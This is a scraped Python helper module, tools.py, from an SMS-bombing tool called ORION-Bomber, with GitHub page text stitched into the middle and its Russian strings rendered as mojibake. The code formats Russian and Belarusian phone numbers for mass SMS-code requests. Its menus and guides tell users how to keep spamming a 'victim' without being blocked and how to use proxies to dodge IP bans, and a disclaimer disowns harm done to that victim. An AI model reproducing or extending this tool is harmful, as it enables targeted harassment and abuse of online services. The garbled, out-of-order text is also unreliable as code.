	print(colored("90% Ð¡ÐµÑ€Ð²Ð¸ÑÐ¾Ð² Ñ Ð±ÐµÑÐ¿Ð»Ð°Ñ‚Ð½Ñ‹Ð¼Ð¸ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð²Ð¾Ñ€ÑƒÑŽÑ‚ Ð¸Ñ… Ð´Ñ€ÑƒÐ³ Ñƒ Ð´Ñ€ÑƒÐ³Ð° Ð¸ Ð¸Ð·-Ð·Ð° ÑÑ‚Ð¾Ð³Ð¾ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð½Ðµ Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒÑÑ Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ Ð±Ð¾Ð»ÑŒÑˆÐ¸Ð¹ ÑÐ¿Ð¸ÑÐ¾Ðº.", "green"))
	print(colored("ÐœÑ‹ ÑÑ‚Ð°Ñ€Ð°ÐµÐ¼ÑÑ Ð¸ÑÐºÐ°Ñ‚ÑŒ Ñ…Ð¾Ñ€Ð¾ÑˆÐ¸Ðµ ÑÐµÑ€Ð²Ð¸ÑÑ‹ Ñ Ð±ÐµÑÐ¿Ð»Ð°Ñ‚Ð½Ñ‹Ð¼Ð¸ Ð¿Ñ€Ð¾ÐºÑÐ¸ ÐºÐ¾Ñ‚Ð¾Ñ€Ñ‹Ðµ Ð½Ðµ Ð²Ð¾Ñ€ÑƒÑŽÑ‚ Ð´Ñ€ÑƒÐ³ Ñƒ Ð´Ñ€ÑƒÐ³Ñƒ Ð¸ ÑƒÐ´Ð¾Ð±Ð½Ñ‹ Ð² Ð¿Ð°Ñ€ÑÐ¸Ð½Ð³Ðµ Ð»Ð¸Ð±Ð¾ Ð¸Ð¼ÐµÑŽÑ‚ ÑÐ²Ð¾Ð¹ API.", "green"))
	print("")
	print("")
	print(colored("Ð¡Ð¾Ð²ÐµÑ‚ÑƒÐµÐ¼ Ð²Ð°Ð¼ Ð¸ÑÐ¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÑŒ Ð²Ð°ÑˆÐ¸ ÑÐ¾Ð±ÑÑ‚Ð²ÐµÐ½Ð½Ñ‹Ðµ Ð¿Ð¾ÐºÑƒÐ¿Ð½Ñ‹Ðµ Ð¿Ñ€Ð¾ÐºÑÐ¸ ÐµÑÐ»Ð¸ Ñ…Ð¾Ñ‚Ð¸Ñ‚Ðµ ÑÐ¾ÐºÑ€Ð°Ñ‚Ð¸Ñ‚ÑŒ Ð±Ð»Ð¾ÐºÐ¸Ñ€Ð¾Ð²ÐºÑƒ Ð²Ð°ÑˆÐµÐ³Ð¾ IP Ñƒ ÑÐµÑ€Ð²Ð¸ÑÐ¾Ð² Ð¸ Ð¸Ð¼ÐµÑ‚ÑŒ Ñ…Ð¾Ñ€Ð¾ÑˆÑƒÑŽ ÑÐºÐ¾Ñ€Ð¾ÑÑ‚ÑŒ ÑÐ¿Ð°Ð¼Ð°", "green"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def inst_logs():
	# Checking File System Access
	try:
		if platform == "linux" or platform == "linux2":
			shutil.copyfile('tools/logs.txt', '/storage/emulated/0/Download/logs.txt')
			shutil.copyfile('tools/error_logs.txt', '/storage/emulated/0/Download/error_logs.txt')
			print(colored("Ð¤Ð°Ð¹Ð»Ñ‹", "green"), colored("logs.txt error_logs.txt", "cyan"), colored("Ð±Ñ‹Ð»Ð¸ ÑÐ¾Ñ…Ñ€Ð°Ð½ÐµÐ½Ñ‹ Ð² Ð¿Ð°Ð¿ÐºÑƒ Download Ð½Ð° Ð²Ð°ÑˆÐµÐ¼ ÑƒÑÑ‚Ñ€Ð¾Ð¹ÑÑ‚Ð²Ðµ", "green"))
			print(colored("ÐŸÐ¾Ð¶Ð°Ð»ÑƒÐ¹ÑÑ‚Ð° Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÑŒÑ‚Ðµ Ð¿Ð¾Ð¾Ñ‡ÐµÑ€ÐµÐ´Ð½Ð¾ ÑÑ‚Ð¸ 2 Ñ„Ð°Ð¹Ð»Ð° Ð½Ð°ÑˆÐµÐ¼Ñƒ Ð±Ð¾Ñ‚Ñƒ Ð² Ñ‚ÐµÐ»ÐµÐ³Ñ€Ð°Ð¼", "green"), colored("https://t.me/orion_feedback_bot", "cyan"))
			print("")
			print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
			input()
		elif platform == "win32":
			print("")
			print(colored("ÐŸÐ¾Ð¶Ð°Ð»ÑƒÐ¹ÑÑ‚Ð° Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÑŒÑ‚Ðµ Ð½Ð°ÑˆÐµÐ¼Ñƒ Ð±Ð¾Ñ‚Ñƒ Ð² Ñ‚ÐµÐ»ÐµÐ³Ñ€Ð°Ð¼", "green"), colored("https://t.me/orion_feedback_bot", "cyan"), colored("Ð¿Ð¾Ð¾Ñ‡ÐµÑ€ÐµÐ´Ð½Ð¾ Ñ„Ð°Ð¹Ð»Ñ‹", "green"), colored("logs.txt error_logs.txt", "cyan"), colored("Ð¸Ð· Ð¿Ð°Ð¿ÐºÐ¸", "green"), colored("tools", "cyan"))
			print("")
			print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
			input()
	except:
		print("")
		print(colored("ÐœÑ‹ Ð½Ðµ ÑÐ¼Ð¾Ð³Ð»Ð¸ Ð¿ÐµÑ€ÐµÐ¼ÐµÑÑ‚Ð¸Ñ‚ÑŒ Ñ„Ð°Ð¹Ð»Ñ‹ Ð² Ð½ÑƒÐ¶Ð½ÑƒÑŽ Ð´Ð¸Ñ€ÐµÐºÑ‚Ð¾Ñ€Ð¸ÑŽ", "yellow"))
		print(colored("Ð’Ð¾Ð·Ð¼Ð¾Ð¶Ð½Ð¾ Ñƒ Ð²Ð°Ñ Ð´Ð»Ñ Ð¢ÐµÑ€Ð¼ÑƒÐºÑÐ° Ð² Ð½Ð°ÑÑ‚Ñ€Ð¾Ð¹ÐºÐ°Ñ… Ñ€Ð°Ð·Ñ€ÐµÑˆÐµÐ½Ð¸Ñ Ð¿Ñ€Ð¸Ð»Ð¾Ð¶ÐµÐ½Ð¸ÑŽ Ð½Ðµ Ð´Ð¾ÑÑ‚ÑƒÐ¿Ð½Ñ‹ Ð¤Ð°Ð¹Ð»Ñ‹ Ð¸ Ð¼ÐµÐ´Ð¸Ð°ÐºÐ¾Ð½Ñ‚ÐµÐ½Ñ‚", "yellow"))
		print(colored("ÐŸÐ¾Ð¶Ð°Ð»ÑƒÐ¹ÑÑ‚Ð° Ñ€Ð°Ð·Ñ€ÐµÑˆÐ¸Ñ‚Ðµ Ð¢ÐµÑ€Ð¼ÑƒÐºÑÑƒ Ð² Ð½Ð°ÑÑ‚Ñ€Ð¾Ð¹ÐºÐ°Ñ… Ð²ÑÐµ Ð½ÑƒÐ¶Ð½Ñ‹Ðµ Ñ€Ð°Ð·Ñ€ÐµÑˆÐµÐ½Ð¸Ñ Ð¸ Ð¿Ð¾Ð²Ñ‚Ð¾Ñ€Ð¸Ñ‚Ðµ Ð¿Ð¾Ð¿Ñ‹Ñ‚ÐºÑƒ"))
		print(colored("Ð—Ð° Ð¿Ð¾Ð¼Ð¾Ñ‰ÑŒÑŽ Ð¿Ð¾ Ð´Ð°Ð½Ð½Ð¾Ð¼Ñƒ Ð²Ð¾Ð¿Ñ€Ð¾ÑÑƒ Ð¿Ð¸ÑˆÐ¸Ñ‚Ðµ Ð² Ð½Ð°ÑˆÐµÐ³Ð¾ Ð±Ð¾Ñ‚Ð° Ð² Ñ‚ÐµÐ»ÐµÐ³Ñ€Ð°Ð¼"), colored("https://t.me/orion_feedback_bot", "cyan"))
		print("")
		print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
		input()

def clear_logs():
	a = open("tools/logs.txt", "w")
	a.close()
	a = open("tools/error_logs.txt", "w")
	a.close()
	print("")
	print(colored("Ð›Ð¾Ð³Ð¸ ÑƒÑÐ¿ÐµÑˆÐ½Ð¾ Ð±Ñ‹Ð»Ð¸ Ð¾Ñ‡Ð¸Ñ‰ÐµÐ½Ñ‹", "green"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def banner_info():
	print(colored("\nÐ¢ÐµÐ»ÐµÐ³Ñ€Ð°Ð¼", "cyan"))
	print("â”œ"+colored("Lucky", "green")+":", colored("https://t.me/Lucky1376", "cyan"))
	print("â”œ"+colored("LostIk", "red")+":", colored("https://t.me/LostIk31", "cyan"))
	print("â””"+colored("ÐšÐ°Ð½Ð°Ð»", "cyan")+":", colored("https://t.me/orion_bomber", "cyan"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def number_ckeck(numb):
	if len(numb) == 9 or len(numb) == 10:
		sp_numb = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
		for i in str(numb):
			try:
				int(i)
			except:
				return False
		return True
	else:
		return False

Sign up
Lucky1376
/
ORION-Bomber
Public
Code
Issues
1
Pull requests
1
Actions
Projects
Security
Insights
ORION-Bomber/tools/tools.py
@Lucky1376
Lucky1376 ðŸŽ„Happy New Year! 1.3.0
â€¦
 4 contributors
978 lines (903 sloc)  41.6 KB
# -*- coding: utf-8 -*-

# Tools for different processing

from termcolor import colored
from datetime import datetime
import requests as r, os, time, random, shutil, zipfile, webbrowser
from sys import platform
from tools import proxy
from progress.bar import ChargingBar
from tools import sender as send

def FormattingNumber(number, country):
	numb = str(number)
	if country == "ru": # For Russia
		if numb[0:1] == "+" and numb[1:2] == "7": # +71234567890
			numb_1 = numb
			numb_2 = numb[1:]
			numb_3 = "8"+numb[2:]
			numb_4 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
			numb_5 = numb[:2] + " " + numb[2:5] + " " + numb[5:8] + " " + numb[8:10] + " " + numb[10:]
			numb_6 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " - " + numb[8:10] + " - " + numb[10:]
			numb_7 = numb[:2] + " ("+numb[2:]
			numb_8 = numb[2:]
			numb_9 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " " + numb[8:10] + numb[10:]
			numb_10 = numb[:2] + ' ' + numb[2:5] + ' ' + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
		elif numb[0:1] == "7":  # 71234567890
			numb_1 = "+"+numb
			numb_2 = numb
			numb_3 = "8"+numb[1:]
			numb = "+"+numb
			numb_4 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
			numb_5 = numb[:2] + " " + numb[2:5] + " " + numb[5:8] + " " + numb[8:10] + " " + numb[10:]
			numb_6 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " - " + numb[8:10] + " - " + numb[10:]
			numb_7 = numb[:2] + " ("+numb[2:]
			numb_8 = numb[2:]
			numb_9 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " " + numb[8:10] + numb[10:]
			numb_10 = numb[:2] + ' ' + numb[2:5] + ' ' + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
		elif numb[0:1] == "8":  # 81234567890
			numb_1 = "+7"+numb[1:]
			numb_2 = "7"+numb[1:]
			numb_3 = numb
			numb = "+7"+numb[1:]
			numb_4 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
			numb_5 = numb[:2] + " " + numb[2:5] + " " + numb[5:8] + " " + numb[8:10] + " " + numb[10:]
			numb_6 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " - " + numb[8:10] + " - " + numb[10:]
			numb_7 = numb[:2] + " ("+numb[2:]
			numb_8 = numb[2:]
			numb_9 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " " + numb[8:10] + numb[10:]
			numb_10 = numb[:2] + ' ' + numb[2:5] + ' ' + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
	elif country == "by": # For Belarus
		if numb[0:1] == "+": # +123456789012
			numb_1 = numb
			numb_2 = numb[1:]
			numb_3 = numb[4:]
			numb_4 = numb[:4] + ' (' + numb[4:6] + ") " + numb[6:9] + '-' + numb[9:11] + '-' + numb[11:13]
			numb_5 = numb[:4] + ' (' + numb[4:6] + ") " + numb[6:9] +numb[9:11] +numb[11:13]
		elif numb[0:1] == "3" or numb[0:3] == "375": # 123456789012
			numb_1 = "+"+numb
			numb_2 = numb
			numb_3 = numb[3:]
			numb_4 = '+' + numb[:3] + ' (' + numb[3:5] + ") " + numb[5:8] + '-' + numb[8:10] + '-' + numb[10:12]
			numb_5 = numb_1[:4] + ' (' + numb_1[4:6] + ") " + numb_1[6:9] +numb_1[9:11] +numb_1[11:13]
	if country == "by":
		return numb_1, numb_2, numb_3, numb_4, numb_5
	elif country == "ru":
		return numb_1, numb_2, numb_3, numb_4, numb_5, numb_6, numb_7, numb_8, numb_9, numb_10

def clear():
	if platform == "linux" or platform == "linux2" or platform == "darwin":
		os.system("clear")
	elif platform == "win32":
		os.system("cls")
	else:
		print(colored("\nÐ˜Ð·Ð²Ð¸Ð½Ð¸Ñ‚Ðµ Ð½Ð°ÑˆÐ° Ð¿Ñ€Ð¾Ð³Ñ€Ð°Ð¼Ð¼Ð° Ð½Ðµ Ð¿Ð¾Ð´Ð´ÐµÑ€Ð¶Ð¸Ð²Ð°ÐµÑ‚ Ð²Ð°ÑˆÑƒ Ð¾Ð¿ÐµÑ€Ð°Ñ†Ð¸Ð¾Ð½Ð½ÑƒÑŽ ÑÐ¸ÑÑ‚ÐµÐ¼Ñƒ ;(\n", "red"))
		exit()

def anim_text(text, speed, color="green"):
	for i in text:
		print(colored(i, color), end="", flush=True)
		time.sleep(speed)

def RCT(text):
	colors = ["green", "yellow", "red", "magenta", "blue"]
	new_text = ""
	for i in str(text):
		new_text += colored(i, random.choice(colors))
	return new_text

def banner():
	a = open("tools/version.txt", "r")
	ver = a.read().split("\n")[0]
	a.close()

	ru_s = str(len(send.services_list))
	by_s = str(len(send.services_list_by))

	banner = colored("""
	   â†   â†       â†        â†     â†   â†   â†
	â†		    â†        â†       â†     â†
	 â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–€â–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–“ â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–„  â† â–ˆ 
	â–’â–ˆâ–ˆâ–’  â–ˆâ–ˆâ–’â–“â–ˆâ–ˆ â–’ â–ˆâ–ˆâ–’â–“â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–’  â–ˆâ–ˆâ–’ â–ˆâ–ˆ â–€â–ˆ   â–ˆ 
	â–’â–ˆâ–ˆâ–‘â† â–ˆâ–ˆâ–’â–“â–ˆâ–ˆ â–‘â–„â–ˆ â–’â–’â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–‘â† â–ˆâ–ˆâ–’â–“â–ˆâ–ˆ  â–€â–ˆ â–ˆâ–ˆâ–’
	â–’â–ˆâ–ˆ   â–ˆâ–ˆâ–‘â–’â–ˆâ–ˆâ–€â–€â–ˆâ–„  â–‘â–ˆâ–ˆâ–‘â–’â–ˆâ–ˆ   â–ˆâ–ˆâ–‘â–“â–ˆâ–ˆâ–’  â–â–Œâ–ˆâ–ˆâ–’
	â–‘ â–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘â–‘â–ˆâ–ˆâ–“ â–’â–ˆâ–ˆâ–’â–‘â–ˆâ–ˆâ–‘â–‘ â–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘â–’â–ˆâ–ˆâ–‘   â–“â–ˆâ–ˆâ–‘
	â–‘ â–’â–‘â–’â–‘â–’â–‘ â–‘ â–’â–“ â–‘â–’â–“â–‘â–‘â–“  â–‘ â–’â–‘â–’â–‘â–’â–‘ â–‘ â–’â–‘ â† â–’ â–’ 
	  â–‘ â–’ â–’â–‘   â–‘â–’ â–‘ â–’â–‘ â–’ â–‘  â–‘ â–’ â–’â–‘ â–‘ â–‘â–‘   â–‘ â–’â–‘
	â–‘ â–‘ â–‘ â–’ â†  â–‘â–‘   â–‘  â–’ â–‘â–‘ â–‘ â–‘ â–’     â–‘   â–‘ â–‘ 
	    â–‘ â–‘     â–‘  â†   â–‘     â†â–‘ â–‘  â†    â†   â–‘ 
	 â†  	â†          â†        â†""", "blue")

	new_year = " "*21+RCT("Happy New Year!")
	pred_info = "\n"+" "*24+colored("Ð¡ÐµÑ€Ð²Ð¸ÑÑ‹", "green")+"\n"
	pred_info_ru = " "*17+colored("Ð Ð¾ÑÑÐ¸Ñ ", "blue")+colored(ru_s, "green")+"   "
	pred_info_by = colored("Ð‘ÐµÐ»Ð°Ñ€ÑƒÑÑŒ ", "cyan")+colored(by_s, "green")+"\n"
	pred_info = pred_info+pred_info_ru+pred_info_by

	info = " "*13+colored("[", "blue")+"Developers :"+colored("Lucky", "green")+" and "+colored("LostIk", "red")
	info_2 = " "*13+colored("[", "blue")+"Version    :"+colored(ver, "red")+"ðŸŽ„"
	info_3 = " "*13+colored("[", "blue")+"Telegram   :"+colored("@orion_bomber", "cyan")+colored("   <--", "green")+"\n"

	print(banner)
	print(new_year)
	print(pred_info)
	print(info)
	print(info_2)
	print(info_3)

def banner_tools():
	print(colored("[1]", "red"), colored("ÐÐ°Ñ‡Ð°Ñ‚ÑŒ ÑÐ¿Ð°Ð¼", "green"))
	#print(colored("[2]", "red"), colored("FAQ ÐŸÑ€Ð¾ Ð¿Ñ€Ð¾ÐºÑÐ¸", "blue"))
	#print(colored("[3]", "red"), colored("ÐšÑ€Ð°Ñ‚ÐºÐ¾Ðµ Ñ€ÑƒÐºÐ¾Ð²Ð¾Ð´ÑÑ‚Ð²Ð¾ Ð¿Ñ€Ð¾Ð±Ð»ÐµÐ¼", "cyan"))
	#print(colored("[4]", "red"), colored("ÐžÑ‚ÐºÐ°Ð· Ð¾Ñ‚ Ð¾Ñ‚Ð²ÐµÑ‚ÑÑ‚Ð²ÐµÐ½Ð½Ð¾ÑÑ‚Ð¸", "red"))
	print(colored("[2]", "red"), colored("ÐŸÐ¾Ð´Ð´ÐµÑ€Ð¶Ð°Ñ‚ÑŒ Ñ€Ð°Ð·Ñ€Ð°Ð±Ð¾Ñ‚Ñ‡Ð¸ÐºÐ¾Ð²!    <---", "green"))
	print(colored("[3]", "red"), colored("Ð˜Ð½ÑÑ‚Ñ€ÑƒÐºÑ†Ð¸Ñ Ð¿Ð¾ Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÐºÐµ Ð»Ð¾Ð³Ð¾Ð²", "yellow"))
	print(colored("\n[99]", "red"), colored("Ð˜Ð½Ñ„Ð¾Ñ€Ð¼Ð°Ñ†Ð¸Ñ", "cyan"))
	print(colored("\n[0] Ð’Ñ‹Ñ…Ð¾Ð´", "red"))

def quick_guide():
	print("")
	print(colored("Ð’ Ð½Ð°ÑˆÐµÐ¼ Ð±Ð¾Ð¼Ð±ÐµÑ€Ðµ ÑÐ¿Ð°Ð¼ Ð¼Ð¾Ð¶ÐµÑ‚ Ð¿Ð¾ÑÑ‚ÐµÐ¿ÐµÐ½Ð½Ð¾ ÑƒÑ…ÑƒÐ´ÑˆÐ°Ñ‚ÑŒÑÑ Ð¸Ð·-Ð·Ð° Ñ‚Ð¾Ð³Ð¾ Ñ‡Ñ‚Ð¾ Ð½Ð° Ð¾Ð´Ð¸Ð½ Ð¸ Ñ‚Ð¾Ñ‚ Ð¶Ðµ Ð½Ð¾Ð¼ÐµÑ€ Ð¿Ð¾ÑÑ‚ÑƒÐ¿Ð°ÐµÑ‚ Ð¾Ñ‡ÐµÐ½ÑŒ Ð¼Ð½Ð¾Ð³Ð¾ Ð·Ð°Ð¿Ñ€Ð¾ÑÐ¾Ð² Ð½Ð° Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÐºÑƒ ÑÐ¼Ñ.", "green"))
	print(colored("ÐÐµ Ð¿Ñ‹Ñ‚Ð°Ð¹Ñ‚ÐµÑÑŒ Ð¾ÑÑ‚Ð°Ð²Ð¸Ñ‚ÑŒ ÑÐ¿Ð°Ð¼ Ð½Ð° Ð²ÑÑŽ Ð½Ð¾Ñ‡ÑŒ Ð½Ð° Ð¾Ð´Ð¸Ð½ Ð¸ Ñ‚Ð¾Ñ‚ Ð¶Ðµ Ð½Ð¾Ð¼ÐµÑ€, Ð²Ñ‹ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð·Ð°ÑÑ‚Ð°Ð²Ð¸Ñ‚Ðµ ÑÐµÑ€Ð²Ð¸ÑÑ‹ Ð·Ð°Ð±Ð»Ð¾ÐºÐ¸Ñ€Ð¾Ð²Ð°Ñ‚ÑŒ Ð´Ð°Ð½Ð½Ñ‹Ð¹ Ð½Ð¾Ð¼ÐµÑ€ Ñƒ ÑÐµÐ±Ñ Ð² Ð±Ð°Ð·Ðµ Ð¸ Ð½Ð¸ÐºÐ°ÐºÐ¸Ðµ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ñ‚ÑƒÑ‚ ÑƒÐ¶Ðµ Ð½Ðµ Ð¿Ð¾Ð¼Ð¾Ð³ÑƒÑ‚.", "green"))
	print(colored("Ð”Ð¾ÑÑ‚Ð°Ñ‚Ð¾Ñ‡Ð½Ð¾ 2-3 ÐºÑ€ÑƒÐ³Ð° Ð½Ð° Ð¾Ð´Ð¸Ð½ Ð½Ð¾Ð¼ÐµÑ€ Ñ€Ð°Ð· Ð² ÑÑƒÑ‚ÐºÐ¸ Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð´Ð¾ÑÑ‚Ð°Ð²Ð¸Ñ‚ÑŒ Ð½Ðµ Ð¼Ð°Ð»Ð¾Ðµ ÐºÐ¾Ð»Ð¸Ñ‡ÐµÑÑ‚Ð²Ð¾ ÑÐ¼Ñ Ð½Ð° Ð¾Ð´Ð¸Ð½ Ð½Ð¾Ð¼ÐµÑ€.", "green"))
	print(colored("ÐÐµ Ð±ÑƒÐ´ÑŒÑ‚Ðµ Ð¶Ð°Ð´Ð½Ñ‹ Ð¸ ÑÐ»Ð¸ÑˆÐºÐ¾Ð¼ Ð¼ÑÑ‚Ð¸Ñ‚ÐµÐ»ÑŒÐ½Ñ‹, Ñ‚Ð¾Ð³Ð´Ð° Ð²Ñ‹ ÑÐ¼Ð¾Ð¶ÐµÑ‚Ðµ Ð¾Ñ‚Ð¿Ñ€Ð°Ð²Ð»ÑÑ‚ÑŒ ÑÐ¼Ñ Ð½Ð° Ð¾Ð´Ð¸Ð½ Ð¸ Ñ‚Ð¾Ñ‚ Ð¶Ðµ Ð½Ð¾Ð¼ÐµÑ€ Ð¿Ð¾ÑÑ‚Ð¾ÑÐ½Ð½Ð¾.", "green"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def disclaimer():
	print("")
	print(colored("Ð Ð°Ð·Ñ€Ð°Ð±Ð¾Ñ‚Ñ‡Ð¸ÐºÐ¸ ÐºÐ¾Ð¼Ð°Ð½Ð´Ñ‹ ORION Ð½Ðµ Ð½ÐµÑÑƒÑ‚ Ð¾Ñ‚Ð²ÐµÑ‚ÑÑ‚Ð²ÐµÐ½Ð½Ð¾ÑÑ‚ÑŒ Ð·Ð° Ð´Ð¾ÑÑ‚Ð°Ð²Ð»ÐµÐ½Ð½Ñ‹Ð¹ Ð¼Ð¾Ñ€Ð°Ð»ÑŒÐ½Ñ‹Ð¹ Ð¸Ð»Ð¸ Ñ„Ð¸Ð·Ð¸Ñ‡ÐµÑÐºÐ¸Ð¹ ÑƒÑ‰ÐµÑ€Ð± Ð²Ð°ÑˆÐµÐ¹ Ð¶ÐµÑ€Ñ‚Ð²Ðµ.", "green"))
	print(colored("ÐŸÐ¾Ð»ÑŒÐ·ÑƒÑÑÑŒ Ð´Ð°Ð½Ð½Ð¾Ð¹ Ð¿Ñ€Ð¾Ð³Ñ€Ð°Ð¼Ð¼Ð¾Ð¹ Ð²Ñ‹ Ð°Ð²Ñ‚Ð¾Ð¼Ð°Ñ‚Ð¸Ñ‡ÐµÑÐºÐ¸ ÑÐ¾Ð³Ð»Ð°ÑˆÐ°ÐµÑ‚ÐµÑÑŒ Ð½Ð° ÑÑ‚Ð¾ Ð¸ Ð±ÐµÑ€ÐµÑ‚Ðµ Ð²ÑÑŽ Ð¾Ñ‚Ð²ÐµÑ‚ÑÑ‚Ð²ÐµÐ½Ð½Ð¾ÑÑ‚ÑŒ Ð½Ð° ÑÐµÐ±Ñ", "green"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def donate():
	print("")
	print(colored("Ð’Ð°ÑˆÐ° Ð¿Ð¾Ð´Ð´ÐµÑ€Ð¶Ð° ÐµÑ‰Ðµ Ð±Ð¾Ð»ÑŒÑˆÐµ Ð¼Ð¾Ñ‚Ð¸Ð²Ð¸Ñ€ÑƒÐµÑ‚ Ð½Ð°Ñ Ð²Ñ‹Ð¿ÑƒÑÐºÐ°Ñ‚ÑŒ Ð¾Ð±Ð½Ð¾Ð²Ð»ÐµÐ½Ð¸Ñ!", "green"))
	print("")
	print(colored("QIWI", "yellow"))
	print("â”œ"+colored("https://qiwi.com/n/LUCKY1376", "cyan"), colored("ÐŸÐµÑ€ÐµÐ²Ð¾Ð´ Ð¿Ð¾ Ð½Ð¸ÐºÐ½ÐµÐ¹Ð¼Ñƒ", "green"))
	print("â”œ"+colored("2200 7302 4344 6206", "cyan"), colored("MIR", "green"))
	print("â””"+colored("4890 4947 5754 5546", "cyan"), colored("VISA", "blue"))
	print("")
	print(colored("Ð¡Ð±ÐµÑ€Ð±Ð°Ð½Ðº", "green"))
	print("â”œ"+colored("2202 2024 3331 7181", "cyan"), colored("MIR", "green"))
	print("â””"+colored("5469 4500 1265 2996", "cyan"), colored("MasterCard", "red"))
	print("")
	print(colored("Ð®Ð¼Ð°Ð½Ð¸", "blue"))
	print("â”œ"+colored("4100 1174 8743 5875", "cyan"), "ÐÐ¾Ð¼ÐµÑ€ ÑÑ‡ÐµÑ‚Ð°")
	print("â””"+colored("2202 1201 0852 7850", "cyan"), colored("MIR", "green"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def faq_proxy():
	print("")
	print(colored("ÐŸÐ¾Ñ‡ÐµÐ¼Ñƒ Ñ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ñ‚Ð°ÐºÐ¾Ð¹ Ð¼ÐµÐ´Ð»ÐµÐ½Ð½Ñ‹Ð¹ ÑÐ¿Ð°Ð¼ Ð¸ Ñ‚Ð°ÐºÐ°Ñ Ñ‡Ð°ÑÑ‚Ð°Ñ Ð¿Ñ€Ð¾Ð²ÐµÑ€ÐºÐ°?", "cyan"))
	print(colored("ÐÐ°Ñˆ Ð¿Ð°Ñ€ÑÐµÑ€ Ð±ÐµÑ€ÐµÑ‚ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ñ Ð¾Ð±Ñ‰ÐµÐ´Ð¾ÑÑ‚ÑƒÐ¿Ð½Ñ‹Ñ… ÑÐµÑ€Ð²Ð¸ÑÐ¾Ð², ÐºÐ¾Ð½ÐµÑ‡Ð½Ð¾ Ð½Ðµ Ñ‚Ð¾Ð»ÑŒÐºÐ¾ Ð¼Ñ‹ Ñ‚Ð°Ðº Ð´ÐµÐ»Ð°ÐµÐ¼ Ð¸ ÑÐ¾Ð¾Ñ‚Ð²ÐµÑÑ‚Ð²ÐµÐ½Ð½Ð¾ Ð½Ðµ Ñ‚Ð¾Ð»ÑŒÐºÐ¾ Ð¼Ñ‹ Ð¿Ð¾Ð»ÑŒÐ·ÑƒÐµÐ¼ÑÑ ÑÑ‚Ð¸Ð¼Ð¸ Ð¿Ñ€Ð¾ÐºÑÐ¸.", "green"))
